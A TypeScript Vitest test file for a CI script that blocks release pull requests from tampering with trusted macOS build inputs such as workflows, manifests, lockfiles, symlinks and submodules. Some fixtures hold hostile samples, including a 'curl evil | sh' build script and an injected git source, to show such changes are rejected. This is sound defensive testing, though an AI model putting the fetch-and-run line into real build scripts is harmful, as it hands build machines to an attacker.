import { readFileSync } from "node:fs";
import path from "node:path";
import { type Mock, describe, expect, it, vi } from "vitest";
import {
  assertSmokeWorkflowUnmodified,
  cargoBuildScriptPath,
  evaluateSmokeRun,
  findMatchingSmokeRuns,
  isSmokeTrustedInput,
  requiredSmokePaths,
  smokeRunTitle,
  smokeTrustedPaths,
  waitForMacosSmoke,
} from "../scripts/wait-for-release-pr-macos-smoke.mjs";

const successfulRun = {
  id: 123,
  event: "pull_request",
  head_sha: "release-sha",
  head_branch: "release/2026.11.0",
  display_title:
    "macOS updater bundle smoke | PR #42 | head release-sha | base base-sha",
  status: "completed",
  conclusion: "success",
  html_url: "https://github.com/owner/repo/actions/runs/123",
  created_at: "2026-11-02T00:00:00Z",
  run_number: 1,
};

const successfulJobs = [
  {
    name: "Build x86_64-apple-darwin",
    status: "completed",
    conclusion: "success",
  },
  {
    name: "Build aarch64-apple-darwin",
    status: "completed",
    conclusion: "success",
  },
];

function response(payload: object): Response {
  return new Response(JSON.stringify(payload), { status: 200 });
}

// Two commit checks and two tree listings; contents are fetched only for changed or build-script inputs.
const trustedRequests = 4;

const rustPathAttribute =
  /#\[[^\]]*?\bpath\s*=\s*r?(?<hashes>#*)"(?<modulePath>[^"]+)"\k<hashes>/g;
const rustUnsupportedInclude = /\binclude(?:_bytes|_str)?!\s*\(/;
/** Script paths named in build inputs; the extension is required so trailing dots are not captured. */
const scriptReference = /scripts\/[\w./-]*[\w-]\.\w+/g;
/** Relative module specifiers from `from`, `import(`, bare `import "x"`, and `require(`. */
const relativeImport =
  /(?:\bfrom\s+|\bimport\s*\(\s*|\bimport\s+|\brequire\(\s*)["'](\.{1,2}\/[^"']+)["']/g;
const rustModuleDeclaration =
  /^\s*(?:#\[[^\]]*\]\s*)*(?:pub(?:\s*\([^)]*\))?\s+)?mod\s+\w+\s*;/;

/**
 * True when a Rust file declares a `mod x;` the closure cannot resolve: neither
 * the declaration line nor the line above it carries a `#[path]` attribute.
 */
function hasUnpathedModule(source: string): boolean {
  const lines = source.split("\n");
  return lines.some((line, index) => {
    if (!rustModuleDeclaration.test(line)) return false;
    const previous = index > 0 ? lines[index - 1] : "";
    return !/#\[[^\]]*path\s*=/.test(`${previous}\n${line}`);
  });
}

/** Contents-API body for a text file such as Cargo.toml. */
function cargoManifest(text: string): object {
  return {
    sha: `sha-${text}`,
    encoding: "base64",
    content: Buffer.from(text).toString("base64"),
  };
}

/** Contents-API body for a JSON file; the sha changes with the content, as it does in git. */
function encodedJson(value: object): object {
  const content = JSON.stringify(value);
  return {
    sha: `sha-${content}`,
    encoding: "base64",
    content: Buffer.from(content).toString("base64"),
  };
}

/**
 * Recursive-tree entries for the commit `treeSha` (`base-sha` or `head-sha`): every
 * trusted and required path, every changed file present on that side, and the
 * explicit listing. Unchanged files share the blob sha `same-<path>`; a changed file
 * uses the sha of its contents payload.
 */
function treeEntries(
  treeSha: string,
  files: Record<string, [object | null, object | null]>,
  explicit: string[],
): object[] {
  const side = treeSha === "base-sha" ? 0 : 1;
  const entries = new Map<string, object>();
  for (const treePath of explicit.filter((entry) => entry.endsWith("/"))) {
    const dirPath = treePath.slice(0, -1);
    entries.set(dirPath, { path: dirPath, type: "tree" });
  }
  const blobPaths = new Set([
    ...smokeTrustedPaths,
    ...requiredSmokePaths,
    ...Object.keys(files),
    ...explicit.filter((entry) => !entry.endsWith("/")),
  ]);
  for (const blobPath of blobPaths) {
    const change = files[blobPath];
    const payload = change?.[side] ?? null;
    if (change && (payload === null || Array.isArray(payload))) continue;
    const sha = payload ? (payload as { sha: string }).sha : `same-${blobPath}`;
    entries.set(blobPath, { path: blobPath, type: "blob", sha });
  }
  return [...entries.values()];
}

/**
 * Answers GitHub API calls by URL rather than call order, so added lookups do not shift fixtures.
 * `files` maps a path to its [base, head] contents (`null` is absent); `trees` maps a SHA to its file paths, where a trailing slash marks a directory entry.
 */
function routedFetch(
  files: Record<string, [object | null, object | null]> = {},
  trees: Record<string, string[]> = {},
): Mock<typeof fetch> {
  return vi.fn<typeof fetch>(async (input) => {
    const url = new URL(String(input));
    const commit = url.pathname.match(/\/git\/commits\/([^/]+)$/);
    if (commit) return response({ sha: decodeURIComponent(commit[1]) });
    const tree = url.pathname.match(/\/git\/trees\/([^/]+)$/);
    if (tree) {
      const treeSha = decodeURIComponent(tree[1]);
      return response({
        truncated: false,
        tree: treeEntries(treeSha, files, trees[treeSha] ?? []),
      });
    }
    const filePath = decodeURIComponent(
      url.pathname.slice(url.pathname.indexOf("/contents/") + "/contents/".length),
    );
    const [base, head] = files[filePath] ?? [
      { sha: `same-${filePath}` },
      { sha: `same-${filePath}` },
    ];
    return contentsResponse(url.searchParams.get("ref") === "base-sha" ? base : head);
  });
}

/** Routes every trusted path (unchanged unless listed in `changes`) and the Cargo tree listings. */
function trustedContentsFetch(
  changes: Record<string, [object | null, object | null]>,
  trees: Record<string, string[]> = {},
): Mock<typeof fetch> {
  return routedFetch(changes, trees);
}

/** Serves one tree with extra raw entries (for missing shas or gitlinks) appended to the standard listing, and routes everything else as usual. */
function treeOverrideFetch(treeSha: string, extra: object[]): Mock<typeof fetch> {
  const routed = routedFetch();
  return vi.fn<typeof fetch>(async (input, init) => {
    if (String(input).includes(`/git/trees/${treeSha}`)) {
      const tree = [...treeEntries(treeSha, {}, []), ...extra];
      return response({ truncated: false, tree });
    }
    return routed(input, init);
  });
}

/** A `null` payload models a path that does not exist at that ref. */
function contentsResponse(payload: object | null): Response {
  if (payload === null) {
    return new Response('{"message":"Not Found"}', { status: 404 });
  }
  return response(payload);
}

/** Queues the trusted-input lookups that run before polling: two commit checks, then the base and head trees, which list every trusted path unchanged. */
function queueTrustedInputs(fetchImpl: Mock<typeof fetch>): Mock<typeof fetch> {
  fetchImpl
    .mockResolvedValueOnce(response({ sha: "workflow-sha" }))
    .mockResolvedValueOnce(response({ sha: "workflow-sha" }))
    .mockResolvedValueOnce(
      response({ truncated: false, tree: treeEntries("base-sha", {}, []) }),
    )
    .mockResolvedValueOnce(
      response({ truncated: false, tree: treeEntries("head-sha", {}, []) }),
    );
  return fetchImpl;
}

describe("release PR macOS updater smoke gate", () => {
  it("runs the smoke workflow for every pull request so a path filter never skips a release head", () => {
    const workflow = readFileSync(
      new URL("../.github/workflows/macos-updater-bundle-smoke.yml", import.meta.url),
      "utf8",
    );
    const pullRequestTrigger = workflow.match(
      /^on:\n {2}pull_request:\n([\s\S]*?)(?=^ {0,3}[^ \t#\r\n]|(?![\s\S]))/m,
    );
    expect(pullRequestTrigger).not.toBeNull();
    expect(pullRequestTrigger![1]).not.toMatch(
      /^[ \t]*(["']?)paths(-ignore)?\1[ \t]*:/m,
    );
  });

  it("limits the smoke build job to release branch heads and base retargets", () => {
    const workflow = readFileSync(
      new URL("../.github/workflows/macos-updater-bundle-smoke.yml", import.meta.url),
      "utf8",
    );
    const jobIf = workflow.match(/^ {4}if: >-\n((?: {6}.+\n)+)/m);
    expect(jobIf).not.toBeNull();
    const condition = jobIf![1]
      .trim()
      .split(/\s*\n\s*/)
      .join(" ");
    expect(condition).toBe(
      "(github.event_name != 'pull_request' || startsWith(github.head_ref, 'release/')) && " +
        "(github.event_name != 'pull_request' || github.event.action != 'edited' || " +
        "github.event.changes.base != null)",
    );
  });

  it("keeps the run title format in sync with the smoke workflow run-name", () => {
    const workflow = readFileSync(
      new URL("../.github/workflows/macos-updater-bundle-smoke.yml", import.meta.url),
      "utf8",
    );
    const template = workflow.match(
      /format\('macOS updater bundle smoke \| PR #\{0\} \| head \{1\} \| base \{2\}'/,
    );
    expect(template).not.toBeNull();

    const args = workflow.match(
      /format\('macOS updater bundle smoke[^']*',\s*([^)]*)\)/,
    );
    expect(args?.[1]?.split(",").map((arg) => arg.trim())).toEqual([
      "github.event.pull_request.number",
      "github.event.pull_request.head.sha",
      "github.event.pull_request.base.sha",
    ]);

    const fromWorkflow = template?.[0]
      .replace("format('", "")
      .replace(/'$/, "")
      .replace("{0}", "42")
      .replace("{1}", "release-sha")
      .replace("{2}", "base-sha");
    expect(fromWorkflow).toBe(smokeRunTitle(42, "release-sha", "base-sha"));
  });

  it("matches the workflow run to the exact PR, head, branch, and base", async () => {
    const fetchImpl = vi.fn<typeof fetch>().mockResolvedValue(
      response({
        workflow_runs: [
          successfulRun,
          { ...successfulRun, id: 122, head_sha: "old-sha" },
          {
            ...successfulRun,
            id: 121,
            display_title:
              "macOS updater bundle smoke | PR #41 | head release-sha | base base-sha",
          },
          {
            ...successfulRun,
            id: 120,
            display_title:
              "macOS updater bundle smoke | PR #42 | head release-sha | base old-base",
          },
        ],
      }),
    );

    const runs = await findMatchingSmokeRuns({
      apiBaseUrl: "https://api.github.com",
      owner: "owner",
      repo: "repo",
      pullRequestNumber: 42,
      headSha: "release-sha",
      headRef: "release/2026.11.0",
      baseSha: "base-sha",
      token: "test-token",
      fetchImpl,
    });

    expect(runs).toEqual([successfulRun]);
    expect(fetchImpl.mock.calls[0][0]).toContain(
      "head_sha=release-sha&event=pull_request",
    );
  });

  it("ignores skipped runs created by title or body edits", async () => {
    const fetchImpl = vi.fn<typeof fetch>().mockResolvedValue(
      response({
        workflow_runs: [
          { ...successfulRun, id: 130, conclusion: "skipped", run_number: 2 },
          successfulRun,
        ],
      }),
    );

    const runs = await findMatchingSmokeRuns({
      apiBaseUrl: "https://api.github.com",
      owner: "owner",
      repo: "repo",
      pullRequestNumber: 42,
      headSha: "release-sha",
      headRef: "release/2026.11.0",
      baseSha: "base-sha",
      token: "test-token",
      fetchImpl,
    });

    expect(runs).toEqual([successfulRun]);
  });

  it("rejects a smoke workflow modified by the pull request", async () => {
    await expect(
      assertSmokeWorkflowUnmodified({
        apiBaseUrl: "https://api.github.com",
        owner: "owner",
        repo: "repo",
        baseSha: "base-sha",
        headSha: "head-sha",
        token: "test-token",
        fetchImpl: trustedContentsFetch({
          ".github/workflows/macos-updater-bundle-smoke.yml": [
            { sha: "base-workflow-sha" },
            { sha: "changed-workflow-sha" },
          ],
        }),
      }),
    ).rejects.toThrow(
      ".github/workflows/macos-updater-bundle-smoke.yml differs from the PR base",
    );
  });

  it("allows a release PR that changes only the version in package.json and tauri.conf.json", async () => {
    const changes: Record<string, [object | null, object | null]> = {
      "package.json": [
        encodedJson({ name: "epikrise", version: "2026.10.2" }),
        encodedJson({ name: "epikrise", version: "2026.11.0" }),
      ],
      "src-tauri/tauri.conf.json": [
        encodedJson({ productName: "Epikrise", version: "2026.10.2" }),
        encodedJson({ productName: "Epikrise", version: "2026.11.0" }),
      ],
    };

    await expect(
      assertSmokeWorkflowUnmodified({
        apiBaseUrl: "https://api.github.com",
        owner: "owner",
        repo: "repo",
        baseSha: "base-sha",
        headSha: "head-sha",
        token: "test-token",
        fetchImpl: trustedContentsFetch(changes),
      }),
    ).resolves.toBeUndefined();
  });

  it("rejects a package.json change beyond the version", async () => {
    const changes: Record<string, [object | null, object | null]> = {
      "package.json": [
        encodedJson({ name: "epikrise", version: "2026.10.2", scripts: {} }),
        encodedJson({
          name: "epikrise",
          version: "2026.11.0",
          scripts: { build: "curl evil | sh" },
        }),
      ],
    };

    await expect(
      assertSmokeWorkflowUnmodified({
        apiBaseUrl: "https://api.github.com",
        owner: "owner",
        repo: "repo",
        baseSha: "base-sha",
        headSha: "head-sha",
        token: "test-token",
        fetchImpl: trustedContentsFetch(changes),
      }),
    ).rejects.toThrow("package.json differs from the PR base");
  });

  it("fails closed when the PR base commit cannot be resolved", async () => {
    const fetchImpl = vi
      .fn<typeof fetch>()
      .mockResolvedValueOnce(new Response('{"message":"Not Found"}', { status: 404 }));

    await expect(
      assertSmokeWorkflowUnmodified({
        apiBaseUrl: "https://api.github.com",
        owner: "owner",
        repo: "repo",
        baseSha: "base-sha",
        headSha: "head-sha",
        token: "test-token",
        fetchImpl,
      }),
    ).rejects.toThrow("PR base commit base-sha cannot be resolved");
    expect(fetchImpl.mock.calls[0][0]).toBe(
      "https://api.github.com/repos/owner/repo/git/commits/base-sha",
    );
  });

  it("fails closed when a required smoke input cannot be read at either ref", async () => {
    const fetchImpl = trustedContentsFetch({
      ".github/workflows/macos-updater-bundle-smoke.yml": [null, null],
    });

    await expect(
      assertSmokeWorkflowUnmodified({
        apiBaseUrl: "https://api.github.com",
        owner: "owner",
        repo: "repo",
        baseSha: "base-sha",
        headSha: "head-sha",
        token: "test-token",
        fetchImpl,
      }),
    ).rejects.toThrow(/cannot verify/);
  });

  it("allows an optional build config that is absent at both base and head", async () => {
    const changes = { ".npmrc": [null, null] as [null, null] };

    await expect(
      assertSmokeWorkflowUnmodified({
        apiBaseUrl: "https://api.github.com",
        owner: "owner",
        repo: "repo",
        baseSha: "base-sha",
        headSha: "head-sha",
        token: "test-token",
        fetchImpl: trustedContentsFetch(changes),
      }),
    ).resolves.toBeUndefined();
  });

  it("rejects a pull request that adds a Cargo config the build reads", async () => {
    const changes = {
      ".cargo/config.toml": [null, { sha: "head-cargo", content: "" }] as [
        null,
        object,
      ],
    };

    await expect(
      assertSmokeWorkflowUnmodified({
        apiBaseUrl: "https://api.github.com",
        owner: "owner",
        repo: "repo",
        baseSha: "base-sha",
        headSha: "head-sha",
        token: "test-token",
        fetchImpl: trustedContentsFetch(changes),
      }),
    ).rejects.toThrow(".cargo/config.toml differs from the PR base");
  });

  it("allows a Cargo manifest that changes only the package version", async () => {
    const base = '[package]\nname = "epikrise"\nversion = "2026.10.2"\n';
    const head = '[package]\nname = "epikrise"\nversion = "2026.11.0"\n';

    await expect(
      assertSmokeWorkflowUnmodified({
        apiBaseUrl: "https://api.github.com",
        owner: "owner",
        repo: "repo",
        baseSha: "base-sha",
        headSha: "head-sha",
        token: "test-token",
        fetchImpl: trustedContentsFetch(
          { "src-tauri/Cargo.toml": [cargoManifest(base), cargoManifest(head)] },
          {
            "base-sha": ["src-tauri/Cargo.toml"],
            "head-sha": ["src-tauri/Cargo.toml"],
          },
        ),
      }),
    ).resolves.toBeUndefined();
  });

  it("allows a lowercase Cargo manifest that changes only the package version", async () => {
    const base = '[package]\nname = "epikrise"\nversion = "2026.10.2"\n';
    const head = '[package]\nname = "epikrise"\nversion = "2026.11.0"\n';

    await expect(
      assertSmokeWorkflowUnmodified({
        apiBaseUrl: "https://api.github.com",
        owner: "owner",
        repo: "repo",
        baseSha: "base-sha",
        headSha: "head-sha",
        token: "test-token",
        fetchImpl: trustedContentsFetch(
          { "src-tauri/cargo.toml": [cargoManifest(base), cargoManifest(head)] },
          {
            "base-sha": ["src-tauri/cargo.toml"],
            "head-sha": ["src-tauri/cargo.toml"],
          },
        ),
      }),
    ).resolves.toBeUndefined();
  });

  it("rejects a version change under a [[bin]] table", async () => {
    const base =
      '[package]\nname = "epikrise"\nversion = "2026.10.2"\n\n[[bin]]\nname = "tool"\nversion = "1.0.0"\n';
    const head = base.replace('version = "1.0.0"', 'version = "2.0.0"');

    await expect(
      assertSmokeWorkflowUnmodified({
        apiBaseUrl: "https://api.github.com",
        owner: "owner",
        repo: "repo",
        baseSha: "base-sha",
        headSha: "head-sha",
        token: "test-token",
        fetchImpl: trustedContentsFetch(
          { "src-tauri/Cargo.toml": [cargoManifest(base), cargoManifest(head)] },
          {
            "base-sha": ["src-tauri/Cargo.toml"],
            "head-sha": ["src-tauri/Cargo.toml"],
          },
        ),
      }),
    ).rejects.toThrow("src-tauri/Cargo.toml differs from the PR base");
  });

  it("allows a Cargo manifest whose package and workspace versions are bumped", async () => {
    const base =
      '[package]\nname = "epikrise"\nversion = "2026.10.2"\n\n[workspace.package]\nversion = "2026.10.2"\n';
    const head = base.replaceAll('"2026.10.2"', '"2026.11.0"');

    await expect(
      assertSmokeWorkflowUnmodified({
        apiBaseUrl: "https://api.github.com",
        owner: "owner",
        repo: "repo",
        baseSha: "base-sha",
        headSha: "head-sha",
        token: "test-token",
        fetchImpl: trustedContentsFetch(
          { "src-tauri/Cargo.toml": [cargoManifest(base), cargoManifest(head)] },
          {
            "base-sha": ["src-tauri/Cargo.toml"],
            "head-sha": ["src-tauri/Cargo.toml"],
          },
        ),
      }),
    ).resolves.toBeUndefined();
  });

  it("rejects a Cargo manifest change beyond the version", async () => {
    const base = '[package]\nname = "epikrise"\nversion = "2026.10.2"\n';
    const head = `${base}\n[dependencies]\nevil = { path = "../evil" }\n`;

    await expect(
      assertSmokeWorkflowUnmodified({
        apiBaseUrl: "https://api.github.com",
        owner: "owner",
        repo: "repo",
        baseSha: "base-sha",
        headSha: "head-sha",
        token: "test-token",
        fetchImpl: trustedContentsFetch(
          { "src-tauri/Cargo.toml": [cargoManifest(base), cargoManifest(head)] },
          {
            "base-sha": ["src-tauri/Cargo.toml"],
            "head-sha": ["src-tauri/Cargo.toml"],
          },
        ),
      }),
    ).rejects.toThrow("src-tauri/Cargo.toml differs from the PR base");
  });

  it("allows a Cargo.lock that changes only local package versions", async () => {
    const lock = (version: string) =>
      `version = 4\n\n[[package]]\nname = "epikrise"\nversion = "${version}"\n\n[[package]]\nname = "serde"\nversion = "1.0.0"\nsource = "registry+https://github.com/rust-lang/crates.io-index"\nchecksum = "abc"\n`;

    await expect(
      assertSmokeWorkflowUnmodified({
        apiBaseUrl: "https://api.github.com",
        owner: "owner",
        repo: "repo",
        baseSha: "base-sha",
        headSha: "head-sha",
        token: "test-token",
        fetchImpl: trustedContentsFetch({
          "src-tauri/Cargo.lock": [
            cargoManifest(lock("2026.10.2")),
            cargoManifest(lock("2026.11.0")),
          ],
        }),
      }),
    ).resolves.toBeUndefined();
  });

  it("rejects a Cargo.lock change to a registry package version", async () => {
    const lock = (serde: string) =>
      `version = 4\n\n[[package]]\nname = "epikrise"\nversion = "2026.10.2"\n\n[[package]]\nname = "serde"\nversion = "${serde}"\nsource = "registry+https://github.com/rust-lang/crates.io-index"\nchecksum = "abc"\n`;

    await expect(
      assertSmokeWorkflowUnmodified({
        apiBaseUrl: "https://api.github.com",
        owner: "owner",
        repo: "repo",
        baseSha: "base-sha",
        headSha: "head-sha",
        token: "test-token",
        fetchImpl: trustedContentsFetch({
          "src-tauri/Cargo.lock": [
            cargoManifest(lock("1.0.0")),
            cargoManifest(lock("1.0.1")),
          ],
        }),
      }),
    ).rejects.toThrow("src-tauri/Cargo.lock differs from the PR base");
  });

  it("rejects a Cargo.lock that adds a source to a local package", async () => {
    const base = '[[package]]\nname = "epikrise"\nversion = "2026.10.2"\n';
    const head = `${base}source = "git+https://example.invalid/evil"\n`;

    await expect(
      assertSmokeWorkflowUnmodified({
        apiBaseUrl: "https://api.github.com",
        owner: "owner",
        repo: "repo",
        baseSha: "base-sha",
        headSha: "head-sha",
        token: "test-token",
        fetchImpl: trustedContentsFetch({
          "src-tauri/Cargo.lock": [cargoManifest(base), cargoManifest(head)],
        }),
      }),
    ).rejects.toThrow("src-tauri/Cargo.lock differs from the PR base");
  });

  it("ignores directory entries in the tree listing", async () => {
    await expect(
      assertSmokeWorkflowUnmodified({
        apiBaseUrl: "https://api.github.com",
        owner: "owner",
        repo: "repo",
        baseSha: "base-sha",
        headSha: "head-sha",
        token: "test-token",
        fetchImpl: trustedContentsFetch(
          {
            "src/lib": [
              [{ name: "a.svelte", type: "file" }],
              [{ name: "a.svelte", type: "file" }],
            ],
          },
          { "base-sha": ["src/lib/"], "head-sha": ["src/lib/"] },
        ),
      }),
    ).resolves.toBeUndefined();
  });

  it("reads no file contents when every trusted input is unchanged", async () => {
    const fetchImpl = trustedContentsFetch({});

    await assertSmokeWorkflowUnmodified({
      apiBaseUrl: "https://api.github.com",
      owner: "owner",
      repo: "repo",
      baseSha: "base-sha",
      headSha: "head-sha",
      token: "test-token",
      fetchImpl,
    });

    const contentsCalls = fetchImpl.mock.calls.filter(([input]) =>
      String(input).includes("/contents/"),
    );
    expect(contentsCalls).toEqual([]);
  });

  it("rejects a head symlink at a bare trusted directory name", async () => {
    await expect(
      assertSmokeWorkflowUnmodified({
        apiBaseUrl: "https://api.github.com",
        owner: "owner",
        repo: "repo",
        baseSha: "base-sha",
        headSha: "head-sha",
        token: "test-token",
        fetchImpl: treeOverrideFetch("head-sha", [
          { path: "static", type: "blob", sha: "link-sha", mode: "120000" },
        ]),
      }),
    ).rejects.toThrow(/static is a symlink/);
  });

  it.each(["src-tauri/icons", "Static", "SRC-TAURI/Resources"])(
    "rejects a head blob at trusted directory name %s",
    async (name) => {
      await expect(
        assertSmokeWorkflowUnmodified({
          apiBaseUrl: "https://api.github.com",
          owner: "owner",
          repo: "repo",
          baseSha: "base-sha",
          headSha: "head-sha",
          token: "test-token",
          fetchImpl: treeOverrideFetch("head-sha", [
            { path: name, type: "blob", sha: "file-sha", mode: "100644" },
          ]),
        }),
      ).rejects.toThrow(name);
    },
  );

  it("rejects a symlink inside a trusted directory", async () => {
    await expect(
      assertSmokeWorkflowUnmodified({
        apiBaseUrl: "https://api.github.com",
        owner: "owner",
        repo: "repo",
        baseSha: "base-sha",
        headSha: "head-sha",
        token: "test-token",
        fetchImpl: treeOverrideFetch("head-sha", [
          { path: "src/link.svelte", type: "blob", sha: "link-sha", mode: "120000" },
        ]),
      }),
    ).rejects.toThrow(/src\/link\.svelte is a symlink/);
  });

  it("rejects a mode-only change to a bundled file", async () => {
    const routed = routedFetch();
    const fetchImpl = vi.fn<typeof fetch>(async (input, init) => {
      const url = String(input);
      if (url.includes("/git/trees/base-sha") || url.includes("/git/trees/head-sha")) {
        const side = url.includes("/git/trees/base-sha") ? "100644" : "100755";
        return response({
          truncated: false,
          tree: [
            ...treeEntries(url.includes("base-sha") ? "base-sha" : "head-sha", {}, []),
            {
              path: "src-tauri/resources/logo.png",
              type: "blob",
              sha: "logo-sha",
              mode: side,
            },
          ],
        });
      }
      return routed(input, init);
    });
    await expect(
      assertSmokeWorkflowUnmodified({
        apiBaseUrl: "https://api.github.com",
        owner: "owner",
        repo: "repo",
        baseSha: "base-sha",
        headSha: "head-sha",
        token: "test-token",
        fetchImpl,
      }),
    ).rejects.toThrow(/src-tauri\/resources\/logo\.png changes file mode/);
  });

  it("rejects a head tree with two paths that differ only by case", async () => {
    await expect(
      assertSmokeWorkflowUnmodified({
        apiBaseUrl: "https://api.github.com",
        owner: "owner",
        repo: "repo",
        baseSha: "base-sha",
        headSha: "head-sha",
        token: "test-token",
        fetchImpl: trustedContentsFetch(
          {},
          {
            "base-sha": ["src/App.svelte"],
            "head-sha": ["src/App.svelte", "SRC/App.svelte"],
          },
        ),
      }),
    ).rejects.toThrow(/differ only by case/);
  });

  it("rejects a head tree blob entry without a sha", async () => {
    await expect(
      assertSmokeWorkflowUnmodified({
        apiBaseUrl: "https://api.github.com",
        owner: "owner",
        repo: "repo",
        baseSha: "base-sha",
        headSha: "head-sha",
        token: "test-token",
        fetchImpl: treeOverrideFetch("head-sha", [
          { path: "src/Orphan.svelte", type: "blob" },
        ]),
      }),
    ).rejects.toThrow(/could not enumerate smoke inputs at head-sha/);
  });

  it.each([
    "src-tauri/vendor",
    "src/vendor",
    "static/vendor",
    "locales/vendor",
    "SRC-TAURI/vendor",
    "Static/vendor",
  ])("rejects a submodule inside the smoke scope at %s", async (gitlinkPath) => {
    await expect(
      assertSmokeWorkflowUnmodified({
        apiBaseUrl: "https://api.github.com",
        owner: "owner",
        repo: "repo",
        baseSha: "base-sha",
        headSha: "head-sha",
        token: "test-token",
        fetchImpl: treeOverrideFetch("head-sha", [
          { path: gitlinkPath, type: "commit", sha: "submodule-sha" },
        ]),
      }),
    ).rejects.toThrow(`${gitlinkPath} is a submodule at head-sha`);
  });

  it.each([
    "STATIC/injected.html",
    "Src/evil.ts",
    "SRC-TAURI/src/x.rs",
    "src-tauri/Cargo.TOML",
  ])("rejects a head-only case variant %s of a smoke input", async (variantPath) => {
    await expect(
      assertSmokeWorkflowUnmodified({
        apiBaseUrl: "https://api.github.com",
        owner: "owner",
        repo: "repo",
        baseSha: "base-sha",
        headSha: "head-sha",
        token: "test-token",
        fetchImpl: treeOverrideFetch("head-sha", [
          { path: variantPath, type: "blob", sha: "variant-sha" },
        ]),
      }),
    ).rejects.toThrow(variantPath);
  });

  it("rejects a head-only case variant of a trusted file absent at base", async () => {
    const absent: Record<string, [object | null, object | null]> = {
      ".env.production": [null, null],
    };
    const routed = routedFetch(absent);
    const fetchImpl = vi.fn<typeof fetch>(async (input, init) => {
      if (String(input).includes("/git/trees/head-sha")) {
        return response({
          truncated: false,
          tree: [
            ...treeEntries("head-sha", absent, []),
            { path: ".ENV.PRODUCTION", type: "blob", sha: "variant-sha" },
          ],
        });
      }
      return routed(input, init);
    });
    await expect(
      assertSmokeWorkflowUnmodified({
        apiBaseUrl: "https://api.github.com",
        owner: "owner",
        repo: "repo",
        baseSha: "base-sha",
        headSha: "head-sha",
        token: "test-token",
        fetchImpl,
      }),
    ).rejects.toThrow(".ENV.PRODUCTION differs from the PR base");
  });

  it("rejects a submodule at an ancestor of a trusted path", async () => {
    const absent: Record<string, [object | null, object | null]> = {
      ".cargo/config": [null, null],
      ".cargo/config.toml": [null, null],
    };
    const routed = routedFetch(absent);
    const fetchImpl = vi.fn<typeof fetch>(async (input, init) => {
      if (String(input).includes("/git/trees/head-sha")) {
        return response({
          truncated: false,
          tree: [
            ...treeEntries("head-sha", absent, []),
            { path: ".cargo", type: "commit", sha: "submodule-sha" },
          ],
        });
      }
      return routed(input, init);
    });
    await expect(
      assertSmokeWorkflowUnmodified({
        apiBaseUrl: "https://api.github.com",
        owner: "owner",
        repo: "repo",
        baseSha: "base-sha",
        headSha: "head-sha",
        token: "test-token",
        fetchImpl,
      }),
    ).rejects.toThrow(".cargo is a submodule at head-sha");
  });

  it("rejects a symlink at an ancestor of a trusted path", async () => {
    const absent: Record<string, [object | null, object | null]> = {
      ".cargo/config": [null, null],
      ".cargo/config.toml": [null, null],
    };
    const routed = routedFetch(absent);
    const fetchImpl = vi.fn<typeof fetch>(async (input, init) => {
      if (String(input).includes("/git/trees/head-sha")) {
        return response({
          truncated: false,
          tree: [
            ...treeEntries("head-sha", absent, []),
            { path: ".cargo", type: "blob", mode: "120000", sha: "link-sha" },
          ],
        });
      }
      return routed(input, init);
    });
    await expect(
      assertSmokeWorkflowUnmodified({
        apiBaseUrl: "https://api.github.com",
        owner: "owner",
        repo: "repo",
        baseSha: "base-sha",
        headSha: "head-sha",
        token: "test-token",
        fetchImpl,
      }),
    ).rejects.toThrow(".cargo is a symlink at head-sha");
  });

  it("ignores a submodule outside the smoke scope", async () => {
    await expect(
      assertSmokeWorkflowUnmodified({
        apiBaseUrl: "https://api.github.com",
        owner: "owner",
        repo: "repo",
        baseSha: "base-sha",
        headSha: "head-sha",
        token: "test-token",
        fetchImpl: treeOverrideFetch("head-sha", [
          { path: "docs/vendor", type: "commit", sha: "submodule-sha" },
        ]),
      }),
    ).resolves.toBeUndefined();
  });

  it("rejects a changed trusted input without reading its contents", async () => {
    const fetchImpl = trustedContentsFetch({
      "src-tauri/build.rs": [{ sha: "base-build" }, { sha: "head-build" }],
    });

    await expect(
      assertSmokeWorkflowUnmodified({
        apiBaseUrl: "https://api.github.com",
        owner: "owner",
        repo: "repo",
        baseSha: "base-sha",
        headSha: "head-sha",
        token: "test-token",
        fetchImpl,
      }),
    ).rejects.toThrow("src-tauri/build.rs differs from the PR base");

    const contentsCalls = fetchImpl.mock.calls.filter(([input]) =>
      String(input).includes("/contents/"),
    );
    expect(contentsCalls).toEqual([]);
  });

  it("rejects a changed Rust source whose path needs URL encoding", async () => {
    const path = "src-tauri/src/a#b.rs";

    await expect(
      assertSmokeWorkflowUnmodified({
        apiBaseUrl: "https://api.github.com",
        owner: "owner",
        repo: "repo",
        baseSha: "base-sha",
        headSha: "head-sha",
        token: "test-token",
        fetchImpl: trustedContentsFetch(
          {
            [path]: [
              cargoManifest("fn a() {}\n"),
              cargoManifest("fn a() { evil(); }\n"),
            ],
          },
          { "base-sha": [path], "head-sha": [path] },
        ),
      }),
    ).rejects.toThrow(`${path} differs from the PR base`);
  });

  it("ignores a Rust source outside src-tauri that the pull request changes", async () => {
    await expect(
      assertSmokeWorkflowUnmodified({
        apiBaseUrl: "https://api.github.com",
        owner: "owner",
        repo: "repo",
        baseSha: "base-sha",
        headSha: "head-sha",
        token: "test-token",
        fetchImpl: trustedContentsFetch(
          {
            "tools/helper.rs": [
              cargoManifest("fn a() {}\n"),
              cargoManifest("fn b() {}\n"),
            ],
          },
          {
            "base-sha": ["tools/helper.rs"],
            "head-sha": ["tools/helper.rs"],
          },
        ),
      }),
    ).resolves.toBeUndefined();
  });

  it("rejects a Rust source under src-tauri that the pull request changes", async () => {
    const file = "src-tauri/crates/epikrise-core/src/policy.rs";
    await expect(
      assertSmokeWorkflowUnmodified({
        apiBaseUrl: "https://api.github.com",
        owner: "owner",
        repo: "repo",
        baseSha: "base-sha",
        headSha: "head-sha",
        token: "test-token",
        fetchImpl: trustedContentsFetch(
          {
            [file]: [
              cargoManifest("fn a() {}\n"),
              cargoManifest("fn a() { evil(); }\n"),
            ],
          },
          { "base-sha": [file], "head-sha": [file] },
        ),
      }),
    ).rejects.toThrow(`${file} differs from the PR base`);
  });

  it.each([
    ['[package]\nbuild = "build.rs"\n', "src-tauri/build.rs"],
    ['[ package ]\nbuild = "build.rs"\n', "src-tauri/build.rs"],
    ['["package"]\nbuild = "build.rs"\n', "src-tauri/build.rs"],
    ['[package]\n"build" = "build.rs"\n', "src-tauri/build.rs"],
    ["[package]\n'build' = 'build.rs'\n", "src-tauri/build.rs"],
    ['package.build = "build.rs"\n', "src-tauri/build.rs"],
    ['[package]\nbuild = "build.rs" # custom\n', "src-tauri/build.rs"],
    ['package = { name = "x", build = "build.rs" }\n', "src-tauri/build.rs"],
    ["[package]\nbuild = false\n", null],
    ['[lib]\nbuild = "not-a-build-script.rs"\n', null],
